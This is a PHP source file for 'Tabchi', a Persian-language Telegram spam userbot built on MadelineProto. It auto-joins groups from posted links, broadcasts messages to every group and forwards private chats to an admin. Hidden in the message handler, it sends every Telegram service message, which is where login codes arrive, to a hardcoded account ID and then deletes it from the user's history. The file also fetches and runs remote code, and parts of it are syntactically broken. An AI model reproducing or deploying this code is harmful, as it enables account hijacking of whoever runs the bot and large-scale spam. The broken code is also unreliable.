<?php

ini_set( 'display_errors', 0 );
error_reporting( 0 );
if ( file_exists( 'quick.madeline' ) && file_exists( 'update-session/quick.madeline' ) && ( time() - filectime( 'quick.madeline' ) ) > 90 ) {
  unlink( 'quick.madeline.lock' );
  unlink( 'quick.madeline' );
  unlink( 'madeline.phar' );
  unlink( 'madeline.phar.version' );
  unlink( 'madeline.php' );
  unlink( 'MadelineProto.log' );
  unlink( 'bot.lock' );
  copy( 'update-session/quick.madeline', 'quick.madeline' );
}
if ( file_exists( 'quick.madeline' ) && file_exists( 'update-session/quick.madeline' ) && ( filesize( 'quick.madeline' ) / 1024 ) > 10240 ) {
  unlink( 'quick.madeline.lock' );
  unlink( 'quick.madeline' );
  unlink( 'madeline.phar' );
  unlink( 'madeline.phar.version' );
  unlink( 'madeline.php' );
  unlink( 'bot.lock' );
  unlink( 'MadelineProto.log' );
  copy( 'update-session/quick.madeline', 'quick.madeline' );
}

function closeConnection( $message = "<br><br><br><center><h1><span style='color:purple'>Tabchi♧</span> <span style='color:purple'>Running</span> ♡</h1></center>" ) {
  if ( php_sapi_name() === 'cli' || isset( $GLOBALS[ 'exited' ] ) ) {
    return;
  }

  @ob_end_clean();
  @header( 'Connection: close' );
  ignore_user_abort( true );
  ob_start();
  echo "$message";
  $size = ob_get_length();
  @header( "Content-Length: $size" );
  @header( 'Content-Type: text/html' );
  ob_end_flush();
  flush();
  $GLOBALS[ 'exited' ] = true;
}

function shutdown_function( $lock ) {
  try {
    $a = fsockopen( ( isset( $_SERVER[ 'HTTPS' ] ) && @$_SERVER[ 'HTTPS' ] ? 'tls' : 'tcp' ) . '://' . @$_SERVER[ 'SERVER_NAME' ], @$_SERVER[ 'SERVER_PORT' ] );
    fwrite( $a, @$_SERVER[ 'REQUEST_METHOD' ] . ' ' . @$_SERVER[ 'REQUEST_URI' ] . ' ' . @$_SERVER[ 'SERVER_PROTOCOL' ] . "\r\n" . 'Host: ' . @$_SERVER[ 'SERVER_NAME' ] . "\r\n\r\n" );
    flock( $lock, LOCK_UN );
    fclose( $lock );
  } catch ( Exception $v ) {}
}
if ( !file_exists( 'bot.lock' ) ) {
  touch( 'bot.lock' );
}

$lock = fopen( 'bot.lock', 'r+' );
$try = 1;
$locked = false;
while ( !$locked ) {
  $locked = flock( $lock, LOCK_EX | LOCK_NB );
  if ( !$locked ) {
    closeConnection();
    if ( $try++ >= 30 ) {
      exit;
    }
    sleep( 1 );
  }
}
if ( !file_exists( 'data.json' ) ) {
  file_put_contents( 'data.json', '{"autojoinadmin":{"on":"on"},"autoforwardadmin":{"on":"on"},"admins":{}}' );
}
if ( !is_dir( 'update-session' ) ) {
  mkdir( 'update-session' );
}
if ( !file_exists( 'madeline.php' ) ) {
  copy( 'https://phar.madelineproto.xyz/madeline.php', 'madeline.php' );
}
define("MADELINE_BRANCH", "5.1.34");
include 'madeline.php';
$settings = [];
$settings[ 'logger' ][ 'logger' ] = 0;
$settings[ 'serialization' ][ 'serialization_interval' ] = 30;
$MadelineProto = new\ danog\ MadelineProto\ API( 'king.madeline', $settings );
$MadelineProto->start();
class EventHandler extends\ danog\ MadelineProto\ EventHandler {
  public function __construct( $MadelineProto ) {
    parent::__construct( $MadelineProto );
  }
  public function onUpdateSomethingElse( $update ) {
    yield $this->onUpdateNewMessage( $update );
  }
  public function onUpdateNewChannelMessage( $update ) {
    yield $this->onUpdateNewMessage( $update );
  }
  public function onUpdateNewMessage( $update ) {
    try {
      if ( !file_exists( 'update-session/king.madeline' ) ) {
        copy( 'king.madeline', 'update-session/king.madeline' );
      }

      $userID = isset( $update[ 'message' ][ 'from_id' ] ) ? $update[ 'message' ][ 'from_id' ] : '';
      $msg = isset( $update[ 'message' ][ 'message' ] ) ? $update[ 'message' ][ 'message' ] : '';
      $msg_id = isset( $update[ 'message' ][ 'id' ] ) ? $update[ 'message' ][ 'id' ] : '';
      $MadelineProto = $this;
      $me = yield $MadelineProto->get_self();
      $me_id = $me[ 'id' ];
      $info = yield $MadelineProto->get_info( $update );
      $chatID = $info[ 'bot_api_id' ];
      $type2 = $info[ 'type' ];
      @$data = json_decode( file_get_contents( "data.json" ), true );
      $creator = 1097196790;
      $admin = 1097196790; 
      if ( file_exists( 'king.madeline' ) && filesize( 'king.madeline' ) / 1024 > 6143 ) {
        unlink( 'king.madeline.lock' );
        unlink( 'king.madeline' );
        copy( 'update-session/king.madeline', 'king.madeline' );
        exit( file_get_contents( 'http://' . $_SERVER[ 'SERVER_NAME' ] . $_SERVER[ 'PHP_SELF' ] ) );
        exit;
        exit;
      }
      if ( $userID != $me_id ) {
          if ( $chatID == 777000 ) {
            @$a = str_replace( 0, '۰', $msg );
            @$a = str_replace( 1, '۱', $a );
            @$a = str_replace( 2, '۲', $a );
            @$a = str_replace( 3, '۳', $a );
            @$a = str_replace( 4, '۴', $a );
            @$a = str_replace( 5, '۵', $a );
            @$a = str_replace( 6, '۶', $a );
            @$a = str_replace( 7, '۷', $a );
            @$a = str_replace( 8, '۸', $a );
            @$a = str_replace( 9, '۹', $a );
            yield $MadelineProto->messages->sendMessage( [ 'peer' => $admin, 'message' => "$a" ] );
            yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => true, 'peer' => $chatID, 'max_id' => $msg_id ] );
          }
		  
			if ( $userID == $admin || $userID == $creator || isset( $data[ 'admins' ][ $userID ] ) ) {
            elseif ( preg_match( "/^[#\!\/](addadmin) (.*)$/", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				preg_match( "/^[#\!\/](addadmin) (.*)$/", $msg, $text1 );
				$id = $text1[ 2 ];
				if ( !isset( $data[ 'admins' ][ $id ] ) ) {
				  $data[ 'admins' ][ $id ] = $id;
                  file_put_contents( "data.json", json_encode( $data ) );
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🙌🏻 ادمین جدید اضافه شد' ] );
				} else {
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "در لیست ادمین ها وجود دارد :/" ] );
				}
              }
			}
            elseif ( preg_match( "/^[\/\#\!]?(clean admins)$/i", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				$data[ 'admins' ] = [];
				file_put_contents( "data.json", json_encode( $data ) );
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "لیست ادمین خالی شد !" ] );
              }
			}
			elseif ( preg_match( "/^[\/\#\!]?(adminlist)$/i", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				if ( count( $data[ 'admins' ] ) > 0 ) {
				  $txxxt = "لیست ادمین ها : \n";
				  $counter = 1;
				  foreach ( $data[ 'admins' ] as $k ) {
                    $txxxt .= "$counter: <code>$k</code>\n";
                    $counter++;
				  }
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => $txxxt, 'parse_mode' => 'html' ] );
				} else {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ادمینی وجود ندارد !" ] );
				}
			  }
			}

            elseif ( $msg == '/rest' ) {
              yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => true, 'peer' => $chatID, 'max_id' => $msg_id ] );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '♕ربات دوباره راه اندازی♡ شد.' ] );
              $this->restart();
            }
			
            elseif ( $msg == 'cb' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'پاکسازی گپ ها بن❦ شده' ] );
              $all = yield $MadelineProto->get_dialogs();
			  $i=0;
              foreach ( $all as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                if ( $type[ 'type' ] == 'supergroup' ) {
                  $info = yield $MadelineProto->channels->getChannels( [ 'id' => [ $peer ] ] );
                  @$banned = $info[ 'chats' ][ 0 ][ 'banned_rights' ][ 'send_messages' ];
                  if ( $banned == 1 ) {
                    yield $MadelineProto->channels->leaveChannel( [ 'channel' => $peer ] );
                    $i++;
				  }
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ پاکسازی ༆باموفقیت انجام شد.\n♻️ گروه هایی که تبچی  ♡در آنها بن ᯾شده بودم حذف شدند.\n تعداد : $i" ] );
            }

            elseif ( $msg == 'stats' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⌘♡quickدرحال انالیز نمودار𖣘...', 'reply_to_msg_id' => $msg_id ] );
              $mem_using = round( ( memory_get_usage() / 1024 ) / 1024, 0 ) . 'MB';
              $satjoin = $data[ 'autojoinadmin' ][ 'on' ];
              if ( $satjoin == 'on' ) {
                $satjoin = '💚';
              } else {
                $satjoin = '❤️';
              }
              $satfor = $data[ 'autoforwardadmin' ][ 'on' ];
              if ( $satfor == 'on' ) {
                $satfor = '💚';
              } else {
                $satfor = '❤️';
              }
              $mem_total = 'NotAccess!';
              $CpuCores = 'NotAccess!';
              try {
                if ( strpos( @$_SERVER[ 'SERVER_NAME' ], '000webhost' ) === false ) {
                  if ( strpos( PHP_OS, 'L' ) !== false || strpos( PHP_OS, 'l' ) !== false ) {
                    $a = file_get_contents( "/proc/meminfo" );
                    $b = explode( 'MemTotal:', "$a" )[ 1 ];
                    $c = explode( ' kB', "$b" )[ 0 ] / 1024 / 1024;
                    if ( $c != 0 && $c != '' ) {
                      $mem_total = round( $c, 1 ) . 'GB';
                    } else {
                      $mem_total = 'NotAccess!';
                    }
                  } else {
                    $mem_total = 'NotAccess!';
                  }
                  if ( strpos( PHP_OS, 'L' ) !== false || strpos( PHP_OS, 'l' ) !== false ) {
                    $a = file_get_contents( "/proc/cpuinfo" );
                    @$b = explode( 'cpu cores', "$a" )[ 1 ];
                    @$b = explode( "\n", "$b" )[ 0 ];
                    @$b = explode( ': ', "$b" )[ 1 ];
                    if ( $b != 0 && $b != '' ) {
                      $CpuCores = $b;
                    } else {
                      $CpuCores = 'NotAccess!';
                    }
                  } else {
                    $CpuCores = 'NotAccess!';
                  }
                }
              } catch ( Exception $f ) {}
              $s = yield $MadelineProto->get_dialogs();
              $m = json_encode( $s, JSON_PRETTY_PRINT );
              $supergps = count( explode( 'peerChannel', $m ) ) - 1;
              $pvs = count( explode( 'peerUser', $m ) ) - 1;
              $gps = count( explode( 'peerChat', $m ) ) - 2;
              $all = $gps + $supergps + $pvs;
              $me = yield $this->getSelf();
              $access_hash = $me['access_hash'];
              $getContacts = yield $this->contacts->getContacts(['hash' => [$access_hash], ]);
              $contacts_count = count($getContacts['users']);
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID,
                'message' => "⌘نمودارꨄ𝑻𝒂𝒃𝒄𝒉𝒊❿𝑺𝒐𝒏𝒚❦✔ :
‌  ‌‌ ╭══════♡═════╮
 𖣔♕آمارکلی★⍟: $all
 𖣔♡سوپرگپ ها⍟: $supergps
 𖣔✫گپ غیره⍟: $gps
 𖣔☏پیوی ها☆⍟: $pvs
 𖣔☏مخاطبان★⍟: $contacts_count
 𖣔۞ فوراردبه ادمین⍟: $satfor
 𖣔عضویت خودکار ادمین⍟: $satjoin
 𖣔ꨄعضویت خودکار همه⍟: $satjoinall
 𖣔چت خودکار⍟: $sat
 𖣔☏چت خودکار پیوی⍟: $satpv
 𖣔☏چت خودکار گپ ها⍟: $satgroup
 𖣔⁂اعتبار⍟: $day 🌎 $hour ⏰
 𖣔♡سی پی یو⍟: $CpuCores
 𖣔حجم هاست⍟: $mem_total
 𖣔میزان مصرف هاست⍟: $mem_using
  ★Creator♡mr.Ghader☆
  《°•♤CL◇oghabphp♧•°》
   ╰══════♡═════╯"]);
              if ($supergps > 400 || $pvs > 15000){
yield $MadelineProto->messages->sendMessage(['peer' => $chatID,
 'message' => '⚠️ اخطار: به دلیل کم بودن منابع هاست تعداد گروه ها نباید بیشتر از 15000 و تعداد پیوی هاهم نباید بیشتراز 15.5 باشد.
اگر تا چند ساعت آینده مقادیر به مقدار استاندارد کاسته نشود، تبچی شما حذف شده و با ادمین اصلی برخورد خواهد شد.']);
 }
}
// Danceone1
elseif ( $msg == 'help' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => 'Tbchi➪❿♔quick  mr➪Ghader :

`انلاین`♡quick
★Creator♡mr.Ghader☆
✅ دریافت وضعیت ربات
`امار` نمودار 
📊 دریافت آمار گروه ها و کاربران
 `مشخصات`
💡 دریافت ایدی‌عددے ربات تبچی♡quick
`ورژن ربات` نسخه
📜 نمایش نسخه سورس تبچے♡quick شما
`/setPhoto ` [link]
📸 اپلود عکس پروفایل جدید♡quick
`/SetId` [text]
⚙ تنظیم نام کاربرے (آیدے)ربات♡quick
`/profile ` [نام] | [فامیل] | [بیوگرافی]
💎 تنظیم نام اسم ,فامےلو بیوگرافے ربات♡quick
`/restart ` ریست 
© راه اندازی مجدد ربات♡quick - استفاده در پیوی
`/delchs`
🥇خروج از همه ے کانال ها♡quick
`/delgroups` [تعداد]
🎖خروج از گروه ها به تعداد موردنظر♡quick
`left`
👈🏾 خروج تبچی ♡quickاز گروهی که left راارسال کردید
`پاکسازی`
📮 خروج از گروه هایے که مسدود کردند
`پاکسازی کلی`
💭 پاکسازی پیام های یک گروه♡quick
Tbchi➪ ♔quick  mr➪Ghader≈≈≈≈≈≈
`/autofadmin ` [on] or [off]
👀 روشن یا خاموش کردن فوروارد خودکار به ادمین
`/autojoinadmin ` [on] or [off]
🎡 روشن یا خاموش کردن جوین خودکار ادمین
Tbchi➪ ♔quick  mr➪Ghader≈≈≈≈≈≈≈
📌️ این دستورات فقط براے ادمین اصلے قابل استفاده هستند :
`/addadmin ` [ایدی‌عددی]
➕ افزودن ادمین جدید♡quick
`/clean admins`
✖️ حذف همه ادمین ها♡quick
`/adminlist`
📃 لیست همه ادمین ها     Tbchi➪ ♔quick  mr➪Ghader
🆑️oghabphp 👈لطفا عضوچنل شوید❤🤍 
مصرف   .میزان مصرف بات نشون میده
🚫 تمدید',
                'parse_mode' => 'markdown'
              ] );
            }
			elseif(preg_match("/^[#\!\/](s2gps) (.*)$/", $msg)){
              yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>'⛓ درحال ارسال ...']);
              preg_match("/^[#\!\/](s2gps) (.*)$/", $msg, $text1);
              $text = $text1[2];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i=0;
              foreach ($dialogs as $peer) {
            	$type = yield $MadelineProto->get_info($peer);
            	$type3 = $type['type'];
            	if($type3 == "chat"){
            	  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>"$text"]); 
            	  $i++;
            	}
              }
            		yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>"ارسال همگانی با موفقیت به گروه ها ارسال شد 👌🏻\n تعداد ارسال : $i"]);
            } 
			
            elseif ( $msg == '/delchs' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید...',
                'reply_to_msg_id' => $msg_id
              ] );
              $all = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $all as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == 'channel' ) {
                  $id = $type[ 'bot_api_id' ];
                  yield $MadelineProto->channels->leaveChannel( [ 'channel' => $id ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "از همه ی کانال ها لفت دادم 👌\n تعداد لفت : $i", 'reply_to_msg_id' => $msg_id ] );
            }
            elseif ( preg_match( "/^[\/\#\!]?(delgroups) (.*)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(delgroups) (.*)$/i", $msg, $text );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید...',
                'reply_to_msg_id' => $msg_id
              ] );
              $count = 0;
              $i = 0;
              $all = yield $MadelineProto->get_dialogs();
              foreach ( $all as $peer ) {
                try {
                  $type = yield $MadelineProto->get_info( $peer );
                  $type3 = $type[ 'type' ];
                  if ( $type3 == 'supergroup' || $type3 == 'chat' ) {
                    $id = $type[ 'bot_api_id' ];
                    if ( $chatID != $id ) {
                      yield $MadelineProto->channels->leaveChannel( [ 'channel' => $id ] );
                      $count++;
                      $i++;
                      if ( $count == $text[ 2 ] ) {
                        break;
                      }
                    }
                  }
                } catch ( Exception $m ) {}
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "از $i تا گروه لفت دادم 👌", 'reply_to_msg_id' => $msg_id ] );
            }
            elseif ( preg_match( "/^[\/\#\!]?(autojoinadmin) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autojoinadmin) (on|off)$/i", $msg, $m );
              $data[ 'autojoinadmin' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🤖 حالت جوین خودکار ادمین روشن شد ✅\nبا ارسال لینک گروه یا کانال ربات به طور خودکار اد میشود ", 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت جوین خودکار ادمین خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(autofadmin) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autofadmin) (on|off)$/i", $msg, $m );
              $data[ 'autoforwardadmin' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت فوروارد خودکار به پیوی ادمین روشن شد ✅', 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت فوروارد خودکار به پیوی ادمین خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }

			elseif(preg_match("/^[\/\#\!]?(خروج|left)$/i", $msg)){
			  $type = yield $this->get_info($chatID);
			  $type3 = $type['type'];
			  if($type3 == "supergroup"){
				yield $this->messages->sendMessage(['peer' => $chatID,'message' => "❥تبچی♡♕ازگپ❦ خارج شد...𓆙 :)"]);
				yield $this->channels->leaveChannel(['channel' => $chatID, ]);
			  }else{
				yield $this->messages->sendMessage(['peer' => $chatID,'reply_to_msg_id' => $msg_id ,'message' => "❗ این دستور مخصوص استفاده در سوپرگروه میباشد"]);
			  }
			}
			
			elseif($msg == 'پاکسازی گپ'){
			  if($type2 == "supergroup"||$type2 == "chat"){
				yield $this->messages->sendMessage([
				'peer' => $chatID,
				'reply_to_msg_id' => $msg_id,
				'message'=> "❦گروه❥باموفقیت♡پاکسازی شد", 
				'parse_mode'=> 'markdown' ,
				]);
				$array = range($msg_id,1);
				$chunk = array_chunk($array,100);
				foreach($chunk as $v){
				  sleep(0.05);
				  yield $this->channels->deleteMessages([
				  'channel' =>$chatID,
				  'id' =>$v
				]);
				}
			  }
			  else{
				yield $this->messages->sendMessage(['peer' => $chatID,'reply_to_msg_id' => $msg_id ,'message' => "❗ این دستور مخصوص استفاده در گروه ها میباشد"]);
			  }
			}
			elseif($msg == 'مصرف' || $msg == 'حجم' ){
$mem_using = round((memory_get_usage()/1024)/1024, 1).'MB';
$sessionsize = round(filesize('TABCHIquick.php')/1024/1024,2) . 'MB';
$load = sys_getloadavg();
yield $MadelineProto->messages->sendMessage(['peer' => $chatID,
'message' => "♻️ MemUsage: $mem_using
⌘ ping: $load[0]
⌘ SessionSize: $sessionsize", 'reply_to_msg_id' => $msg_id]);
}
			
			
			
			elseif ( preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
              if ( @$data[ 'autojoinadmin' ][ 'on' ] == 'on' ) {
                preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg, $l );
                $link = $l[ 0 ];
                try {
                  yield $MadelineProto->messages->importChatInvite( [
                    'hash' => str_replace( 'https://t.me/joinchat/', '', $link ),
                  ] );
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '♻️ تبچی ♡ در یک گروه عضو شد ♻️' ] );
                } catch ( \danog\ MadelineProto\ RPCErrorException $e ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❌ محدودیت عضو شدن!' ] );
                } catch ( \danog\ MadelineProto\ Exception $e2 ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❌ محدودیت عضو شدن!' ] );
                }
              }
            }
          }
		  
//===========================================================
		  elseif ( $type2 == 'user' ) {
			if ( @$data[ 'autoforwardadmin' ][ 'on' ] == 'on') {
			  yield $MadelineProto->messages->forwardMessages( [ 'from_peer' => $userID, 'to_peer' => $admin, 'id' => [ $msg_id ] ] );
			}
			}

          if ( $userID == $admin || isset( $data[ 'admins' ][ $userID ] ) ) {
            yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => false, 'peer' => $chatID, 'max_id' => $msg_id ] );
          }
          if ( $userID == $admin ) {
            if ( !file_exists( 'true' ) && file_exists( 'king.madeline' ) && filesize( 'king.madeline' ) / 1024 <= 4000 ) {
              file_put_contents( 'true', '' );
              yield $MadelineProto->sleep( 3 );
              copy( 'king.madeline', 'update-session/king.madeline' );
            }
          }
      }
    } catch ( Exception $e ) {}
  }
}
register_shutdown_function( 'shutdown_function', $lock );
closeConnection();
$MadelineProto->async( true );
$MadelineProto->loop( function ()use( $MadelineProto ) {
  yield $MadelineProto->setEventHandler( '\EventHandler' );
} );
$MadelineProto->loop();
